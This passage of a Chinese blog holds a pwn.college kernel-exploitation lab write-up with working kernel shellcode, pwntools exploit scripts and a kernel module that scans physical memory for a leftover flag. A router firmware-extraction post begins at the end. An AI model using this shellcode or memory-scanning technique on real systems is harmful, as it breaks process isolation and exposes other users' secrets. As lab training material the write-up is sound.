class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vptr=kmap(PT_addr);<br><span class="hljs-comment">//printk(KERN_INFO &quot;vptr = 0x%lx, mapped_vaddress = 0x%lx\n&quot;,vptr,vptr+page_offset);</span><br><br><span class="hljs-type">char</span> *flag = (<span class="hljs-type">char</span> *)(vptr+page_offset);<br>printk(KERN_INFO <span class="hljs-string">&quot;flag : %s\n&quot;</span>,flag);<br><br>kunmap(page_addr);<br><br><span class="hljs-comment">//unsigned long father_phy_addr = virt_to_phys(v_address);</span><br><span class="hljs-comment">//printk(KERN_INFO &quot;father_phy_addr = 0x%lx&quot;,father_phy_addr);</span><br>&#125;<br></code></pre></td></tr></table></figure><p>汇编中一些关键地址需要手动获取和修改。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">ffffffff81084aa0 T find_get_pid<br>ffffffff810848b0 T get_pid_task<br>ffffffff810b6309 T printk<br>ffffffff81aaa570 T _cond_resched<br><br>gs:current_task = gs:<span class="hljs-number">0x15d00</span><br>page_offset_base = <span class="hljs-number">0xffff888000000000</span><br>vmemmap_base = <span class="hljs-number">0xffffea0000000000</span><br></code></pre></td></tr></table></figure><p>写内核shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs asm">//v2p.s<br>.intel_syntax noprefix<br><br>.section .text<br>.global _start<br>_start:<br>    mov     rax,QWORD PTR gs:0x15d00<br><br>    push    rbx<br>    mov    edi,DWORD PTR [rax+0x490]<br>    add    edi,0x1<br>    mov     rcx,0xffffffff81084aa0<br>    call    rcx<br><br>    xor    esi,esi<br>    mov    rdi,rax<br>    mov     rcx,0xffffffff810848b0<br>    call    rcx<br>    <br>    mov    rcx, 0xffff888000000000          <br>    movabs  rsi,0xffffffffff000<br><br>    mov    rax,QWORD PTR [rax+0x3e0]<br>    mov    rax,QWORD PTR [rax+0x50]<br>    mov    rdi,QWORD PTR [rax]<br>    movabs rax,0xfffffc0000000<br><br>    and    rdi,rsi<br>    mov    rdx,QWORD PTR [rdi+rcx*1]<br>    test   dl,0x80<br>    cmove  rax,rsi<br>    and    rdx,rax<br>    mov    rax,QWORD PTR [rcx+rdx*1+0x10]<br>    movabs rdx,0xfffffffe00000<br><br>    test   al,0x80<br>    cmove  rdx,rsi<br>    and    rax,rdx<br>    mov    rax,QWORD PTR [rcx+rax*1+0x20]<br>    test   rax,rax<br>    <br>    mov    rdx,rax<br>    not    rdx<br>    and    edx,0x1<br>    neg    rdx<br>    xor    rax,rdx<br><br>    shl    rax,0xc<br>    mov    rbx,rax<br>    shr    rbx,0x18<br>    shl    rbx,0x6<br>    mov    rax,0xffffea0000000000<br>    add    rbx,rax  <br>    mov    rax,0xffffffff81aaa570<br>    call   rax       <br><br>    mov    rax,0xffffea0000000000<br>    sub    rbx,rax   <br>    mov    rax,0xffff888000000000      <br>    sar    rbx,0x6<br>    shl    rbx,0xc<br>    lea    rsi,[rbx+rax*1+0x40]<br>    mov rax,0x0a7325<br>    push rax<br>    mov rdi,rsp<br>    mov rax,0xffffffff810b6309<br>    call rax<br>    pop rax<br><br>    ret<br>//gcc -c -o v2p v2p.s -masm=intel -nostdlib -Ttext=0<br>//bin2shellcode shellcode<br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;/challenge/babykernel_level11.1&#x27;</span>)<br><br>ksc = <span class="hljs-string">b&#x27;\x65\x48\x8b\x04\x25\x00\x5d\x01\x00\x53\x8b\xb8\x90\x04\x00\x00\x83\xc7\x01\x48\xc7\xc1\xa0\x4a\x08\x81\xff\xd1\x31\xf6\x48\x89\xc7\x48\xc7\xc1\xb0\x48\x08\x81\xff\xd1\x48\xb9\x00\x00\x00\x00\x80\x88\xff\xff\x48\xbe\x00\xf0\xff\xff\xff\xff\x0f\x00\x48\x8b\x80\xe0\x03\x00\x00\x48\x8b\x40\x50\x48\x8b\x38\x48\xb8\x00\x00\x00\xc0\xff\xff\x0f\x00\x48\x21\xf7\x48\x8b\x14\x0f\xf6\xc2\x80\x48\x0f\x44\xc6\x48\x21\xc2\x48\x8b\x44\x11\x10\x48\xba\x00\x00\xe0\xff\xff\xff\x0f\x00\xa8\x80\x48\x0f\x44\xd6\x48\x21\xd0\x48\x8b\x44\x01\x20\x48\x85\xc0\x48\x89\xc2\x48\xf7\xd2\x83\xe2\x01\x48\xf7\xda\x48\x31\xd0\x48\xc1\xe0\x0c\x48\x89\xc3\x48\xc1\xeb\x18\x48\xc1\xe3\x06\x48\xb8\x00\x00\x00\x00\x00\xea\xff\xff\x48\x01\xc3\x48\xc7\xc0\x70\xa5\xaa\x81\xff\xd0\x48\xb8\x00\x00\x00\x00\x00\xea\xff\xff\x48\x29\xc3\x48\xb8\x00\x00\x00\x00\x80\x88\xff\xff\x48\xc1\xfb\x06\x48\xc1\xe3\x0c\x48\x8d\x74\x03\x40\x48\xc7\xc0\x25\x73\x0a\x00\x50\x48\x89\xe7\x48\xc7\xc0\x09\x63\x0b\x81\xff\xd0\x58\xc3&#x27;</span><br>shellcode = shellcraft.amd64.write(<span class="hljs-number">3</span>,ksc,<span class="hljs-built_in">len</span>(ksc)) <br>usc = asm(shellcode)<br><br>io.recvuntil(<span class="hljs-string">&#x27;Attempting to load the flag into memory.&#x27;</span>)<br>io.sendline(usc)<br><br>io.interactive()<br><span class="hljs-comment">#dmesg</span><br></code></pre></td></tr></table></figure><p>ps:尝试了使用gdb调试fork出的子进程打印内存、设置suid程序等其他方式，但是使用gdb启动suid程序并没有root权限，无法读取&#x2F;flag。</p><h3 id="level12-0-amp-level12-1"><a href="#level12-0-amp-level12-1" class="headerlink" title="level12.0 &amp; level12.1"></a>level12.0 &amp; level12.1</h3><p>和level11唯一的不同点在于level12的子进程读取完flag后exit()结束了进程。</p><p>子进程被杀死后只是销毁了用于映射的内核页表，其原本物理内存中的数据在被其它进程重用前不会被清空（否则会产生较大的开销，影响内核运行效率），因此我们可以在物理内存中搜索flag字符串。</p><p>但是内核态不能直接读写物理内存，需要先将物理内存映射到内核空间。</p><p>笔者在level11中使用kmap，该方式需要先获取页表结构体，但是页表映射已经被销毁，并且无法寻址flag在哪个页表以及确定flag的物理地址。</p><p>笔者还尝试了ioremap，但是该方式只能映射io物理地址空间，参考<a href="https://blog.csdn.net/sijinxiaotongxue/article/details/81123254">该文章</a>，而我们需要映射ram物理地址空间。</p><p>查找资料了解到内核空间中ffff880000000000 - ffffc7ffffffffff地址的64tb空间从0开始线性映射了整个ram物理内存，我们可以直接访问这片空间来读写ram物理内存。</p><p>参考：<a href="https://wjrsbu.smartapps.cn/pages/article/index?id=578569516">［知乎］linux内核虚拟空间布局和内核物理内存映射</a></p><p>现在可以访问物理内存了，两种解题方法:</p><ul><li><p>方法1：遍历物理地址的内核映射空间(经测试一般flag出现在ffff888070000000 - ffff88807ffe0000)，搜索pwn.college字符串。</p><p>参考：<a href="https://www.youtube.com/watch?v=gITPImnJvNM">https://www.youtube.com/watch?v=gITPImnJvNM</a></p></li><li><p>方法2：通过<code>phys_to_virt</code>函数获取物理地址对应的内核映射地址，从0开始线性遍历所有物理地址，搜索pwn.college字符串。</p><p>参考：<a href="https://www.youtube.com/watch?v=WhQlyJoeD7M">https://www.youtube.com/watch?v=WhQlyJoeD7M</a></p></li></ul><p>需要注意的是：在子进程结束之后不能进行太多的内存操作，否则存放flag的物理页在被重用后会被清空，比如python是解释型语言，需要在运行时进行较多的内存操作，如果使用python脚本进行交互，很可能导致flag被覆盖。</p><p>方法1:</p><p>flag的出现有一定随机性，需要重复几次</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>ksc = asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rdi,0xffff888070000000</span><br><span class="hljs-string">    mov rax,0xffffffff810b6309</span><br><span class="hljs-string">    lea rbx,[rip + label]</span><br><span class="hljs-string">    mov rbx,[rbx]</span><br><span class="hljs-string">    top_of_loop:</span><br><span class="hljs-string">    cmp rbx,[rdi]</span><br><span class="hljs-string">    je done</span><br><span class="hljs-string">    inc rdi</span><br><span class="hljs-string">    jmp top_of_loop</span><br><span class="hljs-string">    done:</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    push rdi</span><br><span class="hljs-string">    call rax</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    inc rdi</span><br><span class="hljs-string">    jmp top_of_loop</span><br><span class="hljs-string">    ret</span><br><span class="hljs-string">    label:</span><br><span class="hljs-string">    .string &quot;pwn.college&quot;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>)<br><br>usc = asm(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rax,1</span><br><span class="hljs-string">    mov rdi,3</span><br><span class="hljs-string">    lea rsi,[rip + kernel_sc]</span><br><span class="hljs-string">    mov rdx,0xffff</span><br><span class="hljs-string">    syscall </span><br><span class="hljs-string">    ret </span><br><span class="hljs-string">    kernel_sc:</span><br><span class="hljs-string">        nop</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>)<br>usc += ksc<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;12.sc&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(usc)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">cat 12.sc | /challenge/babykernel_level12.1</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>方法2：</p><p>使用free命令查看总物理内存大小为2029544，注意默认以KB为单位显示，2029544 * 1024 &#x3D; 0x7BDFA000</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@vm_kernel-security~level12-1:~$ free<br>              total        used        free      shared  buff/cache   available<br>Mem:        2029544       16564     1999720           0       13260     1988740<br>Swap:             0           0           0<br></code></pre></td></tr></table></figure><p>在删除模块时遍历搜索物理内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL&quot;</span>); <br>  <br><span class="hljs-type">int</span> <span class="hljs-title function_">init_module</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> <br>&#123; <br>    printk(KERN_INFO <span class="hljs-string">&quot;Hello pwn.college!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br>  <br><span class="hljs-type">void</span> <span class="hljs-title function_">cleanup_module</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> <br>&#123; <br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> i;<br>    printk(KERN_INFO <span class="hljs-string">&quot;LOOKING FOR FLAG!\n&quot;</span>);<br><br>    __asm__(<span class="hljs-string">&quot;nop;nop;nop;nop;&quot;</span>);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0x40</span>;i&lt;<span class="hljs-number">0x7BDFA000</span>;i+=<span class="hljs-number">0x1000</span>)<br>    &#123;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *mapped_addr = phys_to_virt(i);<br>        <span class="hljs-keyword">if</span>(*mapped_addr == <span class="hljs-number">0x6c6c6f632e6e7770</span>)<span class="hljs-comment">//pwn.coll </span><br>        &#123;<br>            printk(KERN_INFO <span class="hljs-string">&quot;FLAG WAS AT %lx: %s&quot;</span>,mapped_addr,(<span class="hljs-type">char</span> *)mapped_addr);<br>        &#125;<br>    &#125;<br>    __asm__(<span class="hljs-string">&quot;nop;nop;nop;nop;&quot;</span>);<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;Goodbye pwn.college!\n&quot;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>sleep_rmmod程序，睡眠一段时间后删除模块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    sleep(<span class="hljs-number">5</span>);<br>    delete_module(<span class="hljs-string">&quot;debug&quot;</span>,<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>为了防止flag所在内存被重用清空，按如下顺序运行程序</p><ul><li><code>insmod phy_search.ko</code></li><li><code>sleep_rmmod</code></li><li><code>/challenge/babykernel_level12.1</code></li></ul><p>验证该方式能获取flag后将<code>phy_search</code>源码中nop之间的部分翻译为内核态shellcode以方法1中的方式输入运行challenge程序即可。</p><h2 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h2><p><a href="https://x3h1n.github.io/2019/06/28/Linux-kernel-pwn%E5%9F%BA%E7%A1%80/">一些技巧汇总</a></p><h3 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h3><p>发现教学视频里可以在同一个窗口切换不同的shell，特别方便，经观察使用的应该是tmux终端复用器，apt install安装即可。</p><p><a href="https://gist.github.com/ryerh/14b7c24dfd623ef8edc7">Tmux 快捷键 &amp; 速查表 &amp; 简明教程</a></p><p><code>ctrl + b</code>在tmux中称为前缀(prefix)，用于快捷键。</p><p>一些常用会话和窗口操作如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">prefix + :new&lt;回车&gt;  #启动新会话<br>prefix + s           #打开会话管理界面，可以查看所有会话状态以及上下切换会话<br>prefix + $           #重命名当前会话<br>prefix + d / tmux detach          #分离会话，会话仍然在后台运行<br>tmux ls              #列出所有会话<br>tmux attach-session -t &lt;session_name&gt;    #进入会话<br>tmux kill-session -t &lt;session_name&gt;      #杀死某个会话<br>tmux kill-server     #杀死所有会话<br>tmux switch-client -t &lt;session_name&gt;     #会话内切换会话<br><br>prefix + c  #创建新窗口<br>prefix + w  #列出所有窗口<br>prefix + n  #后一个窗口<br>prefix + p  #前一个窗口<br>prefix + f  #查找窗口<br>prefix + ,  #重命名当前窗口<br>prefix + &amp; / ctrl + d / exit    #关闭当前窗口<br>prefix + 窗口编号  #快速切换窗口<br><br>Esc     #回退<br></code></pre></td></tr></table></figure><p>另外，每次重启系统session都会丢失，可以安装保存和恢复会话的tmux插件，<a href="https://www.scutmath.com/tmux_session_save_restore.html">参考教程</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">prefix + ctrl-s    #保存session<br>prefix + ctrl-r    #恢复session<br></code></pre></td></tr></table></figure><h3 id="内核调试"><a href="#内核调试" class="headerlink" title="内核调试"></a>内核调试</h3><p>在qemu虚拟机外使用gdb附加调试的具体调试步骤在<code>Environment setup</code>一节中。</p><p>在靶场中可以使用<code>vm</code>命令，以下是一些常用操作</p><ul><li><code>vm connect</code>，连接到qemu启动的客户机，在vm内机器名前会有<code>vm_</code>前缀</li><li><code>vm debug</code>，在vm外使用，启动gdb附加到qemu从外部调试vm</li><li><code>vm build</code>，将内核模块c源码构建为内核模块，可用于获取偏移等操作</li></ul><p>可以<code>objdump</code>反汇编查看程序的入口点，在入口点下断点后再在仿真环境中运行要调试的用户态程序，也可以获取内核符号地址后断在某个内核函数处。</p><h4 id="objdump反汇编"><a href="#objdump反汇编" class="headerlink" title="objdump反汇编"></a>objdump反汇编</h4><p>靶场的环境中有ida，但是并不好用，使用objdump命令可以反汇编文件，例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">objdump -M intel -d <span class="hljs-built_in">exit</span></span><br>exit:     file format elf64-x86-64<br>Disassembly of section .text:<br>0000000000401000 &lt;_start&gt;:<br>  401000:       31 c0                   xor    eax,eax<br>  401002:       b0 3c                   mov    al,0x3c<br>  401004:       0f 05                   syscall<br></code></pre></td></tr></table></figure><h4 id="一些有用的gdb调试语句"><a href="#一些有用的gdb调试语句" class="headerlink" title="一些有用的gdb调试语句"></a>一些有用的gdb调试语句</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">x/5i $rip   #查看rip为地址开始的5条汇编指令<br>disp/5i $rip  #打印rip为地址开始的5条汇编指令,每执行一次gdb指令都会打印一次<br>p/x $rcx  #以16进制形式打印寄存器中的值<br>disp/x $rax #打印rax寄存器的值,每执行一次gdb指令都会打印一次<br>info b   #查看断电信息<br>del num    #删除编号为num的断点<br>info register all  #查看所有寄存器的值<br></code></pre></td></tr></table></figure><h4 id="获取内核符号地址"><a href="#获取内核符号地址" class="headerlink" title="获取内核符号地址"></a>获取内核符号地址</h4><p>拥有符号地址可以方便我们将断点设在函数上，获取内核符号地址有两种方式：</p><ul><li>如果拥有内核映像，可以使用<code>objdump</code>或<code>nm</code>命令，比如：使用<code>objdump -d linux-5.4/vmlinux -M intel | grep do_syscall_64</code>获取<code>do_syscall_64</code>函数的地址</li><li><code>cat /proc/kallsyms</code>，打印所有内核中的符号和地址。只在root权限下有效，否则地址显示为0。</li></ul><h3 id="自制linux实用工具"><a href="#自制linux实用工具" class="headerlink" title="自制linux实用工具"></a>自制linux实用工具</h3><h4 id="lookup-syscall"><a href="#lookup-syscall" class="headerlink" title="lookup_syscall"></a>lookup_syscall</h4><p>输入系统调用名输出系统调用号或输入系统调用号输出系统调用名</p><p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240302193623.png" alt="12"></p><h4 id="bin2shellcode"><a href="#bin2shellcode" class="headerlink" title="bin2shellcode"></a>bin2shellcode</h4><p>便于shellcode编写，将二进制文件转换成16进制shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br>for i in $(objdump -d $1 |grep &quot;^ &quot; |cut -f2); do echo -n &#x27;\x&#x27;$i; done;echo<br></code></pre></td></tr></table></figure><h4 id="assemble"><a href="#assemble" class="headerlink" title="assemble"></a>assemble</h4><p>集成化shellcode编写工具</p><ul><li><p>生成代码对应的汇编代码文件(.s)、ELF文件、二进制纯机器码文件(.raw)。</p></li><li><p>使用<code>objdump</code>工具输出反汇编结果，<code>hd</code>工具输出.raw文件的16进制。</p></li><li><p>生成适配c、python2、python3和shell语言的shellcode代码</p></li><li><p>输出strace命令跟踪系统调用的结果</p></li></ul><p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240302194227.png" alt="13"></p>]]></content>
    
    
    <categories>
      
      <category>PwnCollege刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux kernel</tag>
      
      <tag>Pwn</tag>
      
      <tag>PwnCollege</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TL-WR886N路由器uart调试及VxWorks固件提取和分析</title>
    <link href="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/"/>
    <url>/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="TL-WR886N路由器uart调试及VxWorks固件提取和分析"><a href="#TL-WR886N路由器uart调试及VxWorks固件提取和分析" class="headerlink" title="TL-WR886N路由器uart调试及VxWorks固件提取和分析"></a>TL-WR886N路由器uart调试及VxWorks固件提取和分析</h1><p>咸鱼买的二手路由器，用来练习。<a href="https://zhuanlan.zhihu.com/p/502926882?utm_id=0">这篇文章</a>对该路由器的拆解以及元器件有简单的介绍，外壳只有两颗螺丝能卸下，剩下的只能暴力拆解。另外，这类网络设备的螺丝很多会藏在贴纸下面，比如下图右侧那颗。</p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/IMG_20240220_143542.jpg"></p><p>拆解后找到闪存和uart口，笔者最近接触到的两个老路由器和一个无线ap的flash都是8脚的，uart一般是3-5个孔。</p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/IMG_20240220_172342.jpg"></p><p>背面</p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/IMG_20240220_182643-1708424937197.jpg"></p><p>用到的工具和软件</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">ch341A</span>编程器<br><span class="hljs-symbol">SOP8</span>测试夹+转接板<br>好易通测试夹<br><span class="hljs-symbol">ch340</span> usb转<span class="hljs-meta">ttl</span>模块<br><span class="hljs-symbol">Asprogrammer</span><br><span class="hljs-symbol">SecureCRT</span><br>螺丝刀<br></code></pre></td></tr></table></figure><h2 id="编程器提取固件"><a href="#编程器提取固件" class="headerlink" title="编程器提取固件"></a>编程器提取固件</h2><p>参考z1r0大佬写的<a href="https://bbs.kanxue.com/thread-276700.htm">文章</a></p><p>路由器不接电源，flash上最靠近圆圈的一角引脚编号为1，逆时针分别为2，3，4，5，6，7，8。测试夹的红线对应编号1的引脚。</p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/IMG_20240221_230213(1).jpg"></p><p>连接正确时，路由器的电源灯和ch340模块的电源灯都会亮。</p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/IMG_20240221_230232(1).jpg"></p><p>然后就是安装ch340驱动，照着参考文章做就行，需要注意的是在<code>点击设置，windows更新，点击查看所有可选更新，找到驱动程序更新里的wch.cn</code>这一步如果找不到该更新，可以重启电脑。</p><p>安装完驱动和软件后插入ch340，read id，选择型号，read ic，save file即可</p><p><img src="/2024/02/25/TL-WR886N%E8%B7%AF%E7%94%B1%E5%99%A8uart%E8%B0%83%E8%AF%95%E5%8F%8AVxWorks%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%92%8C%E5%88%86%E6%9E%90/QQ%E6%88%AA%E5%9B%BE20240221235522.png"></p><h2 id="uart调试-固件转储"><a href="#uart调试-固件转储" class="headerlink" title="uart调试+固件转储"></a>uart调试+固件转储</h2><p><a href="https://www.secpulse.com/archives/157847.html">参考文章</a></p><h3 id="分辨引脚"><a href="#分辨引脚" class="headerlink" title="分辨引脚"></a>分辨引脚</h3><p>辨别方法参考，顺序：GND-&gt;Vcc-&gt;TXD-&gt;RXD</p><p>从背面看，自左往右分别编号为1，2，3，4，由于这里是垂直翻转的，从正面看和从背面看孔的顺序相同</p><ul><li>GND</li></ul><p>孔2是GND。万用表调至蜂鸣档，黑表笔接电源引脚，红表笔依次尝试接4个uart孔，有蜂鸣红灯亮的就是GND。</p><p><img 